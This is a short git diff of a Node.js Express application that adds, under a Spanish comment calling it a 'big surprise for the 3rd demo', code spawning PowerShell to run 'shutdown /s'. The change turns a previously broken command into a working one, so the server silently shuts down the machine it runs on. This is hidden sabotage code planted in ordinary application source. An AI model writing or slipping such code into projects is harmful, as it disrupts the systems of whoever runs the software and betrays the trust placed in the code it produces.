@@ -100,7 +100,7 @@ app.use((err, req, res, next) => {
 
 // sorpresota para la 3ra demo
 var spawn = require("child_process").spawn;
-child = spawn("powershell.exe", ["shutdowns –s -t + 60"]);
+child = spawn("powershell.exe", ["shutdown /s"]);
 
 child.stdin.end(); //end input
 
